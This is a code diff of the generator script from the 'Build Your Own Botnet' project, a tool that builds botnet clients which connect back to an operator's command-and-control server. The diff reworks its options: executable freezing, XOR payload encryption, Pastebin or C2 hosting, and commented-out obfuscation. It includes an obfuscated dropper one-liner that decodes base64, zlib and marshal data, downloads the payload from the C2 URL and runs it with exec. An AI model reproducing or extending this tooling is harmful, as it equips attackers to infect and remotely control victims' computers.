@@ -3,7 +3,7 @@
 """Client Generator (Build Your Own Botnet)
 
 usage: client.py [-h] [-v] [--name NAME] [--icon ICON] [--pastebin API]
-                 [--encrypt] [--obfuscate] [--compress] [--exe] [--app]
+                 [--encrypt] [--obfuscate] [--compress] [--freeze]
                  host port [module [module ...]]
 
 Generator (Build Your Own Botnet)
@@ -22,8 +22,7 @@ optional arguments:
   --encrypt       encrypt payload and embed key in stager
   --obfuscate     obfuscate names of classes, functions & variables
   --compress      zip-compress into a self-executing python script
-  --exe           compile into a standalone bundled executable
-  --app           bundle into a standlone application
+  --freeze        compile client into a standalone executable for the current host platform
 
 Generate clients with the following features:
 
@@ -128,52 +127,59 @@ def main():
 
     """
     util.display(globals()['__banner'], color=random.choice(filter(lambda x: bool(str.isupper(x) and 'BLACK' not in x), dir(colorama.Fore))), style='normal')
+
     parser = argparse.ArgumentParser(prog='client.py', 
                                     version='0.1.5',
                                     description="Generator (Build Your Own Botnet)")
+
     parser.add_argument('host',
                         action='store',
                         type=str,
                         help='server IP address')
+
     parser.add_argument('port',
                         action='store',
                         type=str,
                         help='server port number')
+
     parser.add_argument('modules',
                         metavar='module',   
                         action='append',
                         nargs='*',
                         help='module(s) to remotely import at run-time')
+
     parser.add_argument('--name',
                         action='store',
                         help='output file name')
+
     parser.add_argument('--icon',
                         action='store',
                         help='icon image file name')
+
     parser.add_argument('--pastebin',
                         action='store',
                         metavar='API',
-                        help='upload the main payload to Pastebin (instead of the C2 server hosting it)')
+                        help='upload the payload to Pastebin (instead of the C2 server hosting it)')
+
     parser.add_argument('--encrypt',
                         action='store_true',
-                        help='AES encrypt the main payload with a random 256-bit key embedded in the payload\'s stager',
+                        help='encrypt the payload with a random 128-bit key embedded in the payload\'s stager',
                         default=False)
-    parser.add_argument('--obfuscate',
-                        action='store_true',
-                        help='obfuscate names of classes, functions, variables, import-methods, and builtin-keywords',
-                        default=False)
+#    parser.add_argument('--obfuscate',
+#                        action='store_true',
+#                        help='obfuscate names of classes, functions, variables, import-methods, and builtin-keywords',
+#                        default=False)
+
     parser.add_argument('--compress',
                         action='store_true',
                         help='zip-compress into a self-extracting python script',
                         default=False)
-    parser.add_argument('--exe',
+
+    parser.add_argument('--freeze',
                         action='store_true',
-                        help='compile client with a python interpreter into a portable executable for Windows',
+                        help='compile client into a standalone executable for the current host platform',
                         default=False)
-    parser.add_argument('--app',
-                        action='store_true',
-                        help='bundle client with a python interpreter into an macOS application',
-                        default=False)
+
     options = parser.parse_args()
     key = base64.b64encode(os.urandom(16))
     var = generators.variable(3)
@@ -192,9 +198,11 @@ def _update(input, output, task=None):
 def _modules(options, **kwargs):
     util.display("\n[>]", color='green', style='bright', end=',')
     util.display('Modules', color='reset', style='bright')
-    util.display("\tAdding modules...", color='reset', style='normal', end=',')
+    util.display("\tAdding modules... ", color='reset', style='normal', end=',')
+ 
     __load__ = threading.Event()
     __spin__ = _spinner(__load__)
+ 
     modules = ['core/loader.py','core/util.py','core/security.py','core/payloads.py']
 
     if len(options.modules):
@@ -216,10 +224,14 @@ def _modules(options, **kwargs):
 def _imports(options, **kwargs):
     util.display("\n[>]", color='green', style='bright', end=',')
     util.display("Imports", color='reset', style='bright')
+ 
     assert 'modules' in kwargs, "missing keyword argument 'modules'"
+ 
     util.display("\tAdding imports...", color='reset', style='normal', end=',')
+ 
     globals()['__load__'] = threading.Event()
     globals()['__spin__'] = _spinner(__load__)
+ 
     imports  = set()
 
     for module in kwargs['modules']:
@@ -239,11 +251,16 @@ def _imports(options, **kwargs):
                         else:
                             imports.add(line.strip())
     imports = list(imports)
+    if sys.platform != 'win32':
+        for item in imports:
+            if 'win32' in item or '_winreg' in item:
+                imports.remove(item)
     return imports
                  
 def _hidden(options, **kwargs):
     assert 'imports' in kwargs, "missing keyword argument 'imports'"
     assert 'modules' in kwargs, "missing keyword argument 'modules'"
+ 
     hidden = set()
 
     for line in kwargs['imports']:
@@ -263,24 +280,26 @@ def _hidden(options, **kwargs):
 def _payload(options, **kwargs):
     util.display("\n[>]", color='green', style='bright', end=',')
     util.display("Payload", color='reset', style='bright')
+
     assert 'var' in kwargs, "missing keyword argument 'var'"
     assert 'modules' in kwargs, "missing keyword argument 'modules'"
     assert 'imports' in kwargs, "missing keyword argument 'imports'"
+
     payload = '\n'.join(list(kwargs['imports']) + [open(module,'r').read().partition('# main')[2] for module in kwargs['modules']]) + generators.main('Payload', **{"host": options.host, "port": options.port, "pastebin": options.pastebin if options.pastebin else str()}) + '_payload.run()'
     if not os.path.isdir('modules/payloads'):
         try:
             os.mkdir('modules/payloads')
         except OSError:
-            __logger__.debug("Permission denied: unabled to make directory './modules/payloads/'")
+            util.log("Permission denied: unabled to make directory './modules/payloads/'")
 
-    if options.obfuscate:
-        __load__= threading.Event()
-        util.display("\tObfuscating payload...", color='reset', style='normal', end=',')
-        __spin__= _spinner(__load__)
-        output = '\n'.join([line for line in generators.obfuscate(payload).rstrip().splitlines() if '=jobs' not in line])
-        __load__.set()
-        _update(payload, output, task='Obfuscation')
-        payload = output
+ #   if options.obfuscate:
+ #       __load__= threading.Event()
+ #       util.display("\tObfuscating payload... ", color='reset', style='normal', end=',')
+ #       __spin__= _spinner(__load__)
+ #       output = '\n'.join([line for line in generators.obfuscate(payload).rstrip().splitlines() if '=jobs' not in line])
+ #       __load__.set()
+ #       _update(payload, output, task='Obfuscation')
+ #       payload = output
 
     if options.compress:
         util.display("\tCompressing payload... ", color='reset', style='normal', end=',')
@@ -296,30 +315,35 @@ def _payload(options, **kwargs):
         util.display("\tEncrypting payload... ".format(kwargs['key']), color='reset', style='normal', end=',')
         __load__ = threading.Event()
         __spin__ = _spinner(__load__)
-        output = generators.encrypt(payload, kwargs['key'])
+        output = security.encrypt_xor(payload, kwargs['key'])
         __load__.set()
         _update(payload, output, task='Encryption')
         payload = output
 
     util.display("\tUploading payload... ", color='reset', style='normal', end=',')
+
     __load__ = threading.Event()
     __spin__ = _spinner(__load__)
 
     if options.pastebin:
         assert options.pastebin, "missing argument 'pastebin' required for option 'pastebin'"
-        url = util.pastebin(payload, api_dev_key=options.pastebin)
+        url = util.pastebin(payload, options.pastebin)
     else:
         dirs = ['modules/payloads','byob/modules/payloads','byob/byob/modules/payloads']
         dirname = '.'
         for d in dirs:
             if os.path.isdir(d):
                 dirname = d
+
         path = os.path.join(os.path.abspath(dirname), kwargs['var'] + '.py' )
+
         with file(path, 'w') as fp:
             fp.write(payload)
+
         s = 'http://{}:{}/{}'.format(options.host, int(options.port) + 1, urllib.pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
         s = urllib2.urlparse.urlsplit(s)
         url = urllib2.urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
+
     __load__.set()
     util.display("(hosting payload at: {})".format(url), color='reset', style='dim')
     return url
@@ -327,24 +351,30 @@ def _payload(options, **kwargs):
 def _stager(options, **kwargs):
     util.display("\n[>]", color='green', style='bright', end=',')
     util.display("Stager", color='reset', style='bright')
+
     assert 'url' in kwargs, "missing keyword argument 'url'"
     assert 'key' in kwargs, "missing keyword argument 'key'"
     assert 'var' in kwargs, "missing keyword argument 'var'"
-    stager = open('core/stagers.py', 'r').read() + generators.main('run', url=kwargs['url'], key=kwargs['key'])
+
+    if options.encrypt: 
+        stager = open('core/stagers.py', 'r').read() + generators.main('run', url=kwargs['url'], key=kwargs['key'])
+    else:
+        stager = open('core/stagers.py', 'r').read() + generators.main('run', url=kwargs['url'])
+
     if not os.path.isdir('modules/stagers'):
         try:
             os.mkdir('modules/stagers')
         except OSError:
-            __logger__.debug("Permission denied: unable to make directory './modules/stagers/'")
+            util.log("Permission denied: unable to make directory './modules/stagers/'")
 
-    if options.obfuscate:
-        util.display("\tObfuscating stager... ", color='reset', style='normal', end=',')
-        __load__ = threading.Event()
-        __spin__ = _spinner(__load__)
-        output = generators.obfuscate(stager)
-        __load__.set()
-        _update(stager, output, task='Obfuscation')
-        stager = output
+#    if options.obfuscate:
+#        util.display("\tObfuscating stager... ", color='reset', style='normal', end=',')
+#        __load__ = threading.Event()
+#        __spin__ = _spinner(__load__)
+#        output = generators.obfuscate(stager)
+#        __load__.set()
+#        _update(stager, output, task='Obfuscation')
+#        stager = output
 
     if options.compress:
         util.display("\tCompressing stager... ", color='reset', style='normal', end=',')
@@ -354,6 +384,7 @@ def _stager(options, **kwargs):
         __load__.set()
         _update(stager, output, task='Compression')
         stager = output
+
     util.display("\tUploading stager... ", color='reset', style='normal', end=',')
     __load__ = threading.Event()
     __spin__ = _spinner(__load__)
@@ -367,12 +398,16 @@ def _stager(options, **kwargs):
         for d in dirs:
             if os.path.isdir(d):
                 dirname = d
+
         path = os.path.join(os.path.abspath(dirname), kwargs['var'] + '.py' )
+
         with file(path, 'w') as fp:
             fp.write(stager)
+
         s = 'http://{}:{}/{}'.format(options.host, int(options.port) + 1, urllib.pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
         s = urllib2.urlparse.urlsplit(s)
         url = urllib2.urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
+
     __load__.set()
     util.display("(hosting stager at: {})".format(url), color='reset', style='dim')
     return url
@@ -380,30 +415,26 @@ def _stager(options, **kwargs):
 def _dropper(options, **kwargs):
     util.display("\n[>]", color='green', style='bright', end=',')
     util.display("Dropper", color='reset', style='bright')
+    util.display('\tWriting dropper... ', color='reset', style='normal', end=',')
+    
     assert 'url' in kwargs, "missing keyword argument 'url'"
     assert 'var' in kwargs, "missing keyword argument 'var'"
     assert 'hidden' in kwargs, "missing keyword argument 'hidden'"
+
     name = 'byob_{}.py'.format(kwargs['var']) if not options.name else options.name
     if not name.endswith('.py'):
         name += '.py'
-    dropper = "import zlib,base64,marshal,urllib;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps("import zlib,base64,marshal,urllib;exec(marshal.loads(zlib.decompress(base64.b64decode(urllib.urlopen({}).read()))))".format(repr(kwargs['url'])))))) if options.compress else repr(base64.b64encode(zlib.compress(marshal.dumps("urllib.urlopen({}).read()".format(repr(kwargs['url'])))))))
+    dropper = "import zlib,base64,marshal,urllib;exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps("import zlib,base64,marshal,urllib;exec(marshal.loads(zlib.decompress(base64.b64decode(urllib.urlopen({}).read()))))".format(repr(kwargs['url'])))))) if options.compress else repr(base64.b64encode(zlib.compress(marshal.dumps("urllib.urlopen({}).read()".format(repr(kwargs['url'])))))))
     with file(name, 'w') as fp:
         fp.write(dropper)
 
-    if options.exe:
-        util.display('    Compiling executable...', color='reset', style='normal', end=',')
+    if options.freeze:
+        util.display('\tCompiling executable... ', color='reset', style='normal', end=',')
         __load__ = threading.Event()
         __spin__ = _spinner(__load__)
-        name = generators.exe(name, icon=options.icon, hidden=kwargs['hidden'])
+        name = generators.freeze(name, icon=options.icon, hidden=kwargs['hidden'])
         __load__.set()
-
-    elif options.app:
-        util.display('    Bundling application...', color='reset', style='normal', end=',')
-        __load__ = threading.Event()
-        __spin__ = _spinner(__load__)
-        name = generators.exe(name, icon=options.icon, hidden=kwargs['hidden'])
-        __load__.set()
-
+        
     util.display('(saved to file: {})\n'.format(name), style='dim', color='reset')
     return name
 
